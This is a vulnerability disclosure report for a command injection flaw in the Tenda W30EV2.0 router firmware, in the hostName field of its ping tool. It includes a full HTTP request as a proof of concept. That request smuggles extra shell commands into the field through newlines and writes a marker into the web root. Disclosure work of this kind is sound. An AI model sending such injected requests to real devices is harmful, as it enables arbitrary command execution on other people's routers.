### REPORTING INFO
- Vendor: Tenda
- Product: Tenda W30EV2.0
- Version: V16.01.0.21
- Manufacturer's address: https://www.tendacn.com/
- Firmware download address: https://www.tenda.com.cn/prod/api/data/center/download/541288615886917/778343078879301

### Vulnerability details
Tenda W30EV2.0 V16.01.0.21 was found to contain a command injection vulnerability in the `do_ping_action` function via the `hostName` parameter. This vulnerability allows attackers to execute arbitrary commands via a crafted request.

Function `do_ping_action`:
![pic](https://github.com/jsjbcyber/repo/blob/main/imgs/1.png)

Function `cmd_get_ping_output`:
![pic](https://github.com/jsjbcyber/repo/blob/main/imgs/2.png)


**POC**

```
POST /goform/module?1774630088898 HTTP/1.1
Host: 172.22.3.12
Content-Length: 140
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Accept: text/plain, */*; q=0.01
Content-Type: application/json
Origin: http://172.22.3.12
Referer: http://172.22.3.12/index.html?v=0
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: bLanguage=cn; sessionid=W30EV2.0:48.1.1:c88b2f
Connection: keep-alive

{"setFixTools":{"networkTool":1,"hostName":"192.168.1.1 -c 3\necho pwned!!!!>>/webroot_ro/index.html\nping 192.168.1.1  ","packageSize":32}}
```

Then, you will find that the character "pwned!!!!" has been written to the end of the "/webroot_ro/index.html" file.
![pic](https://github.com/jsjbcyber/repo/blob/main/imgs/3.png)
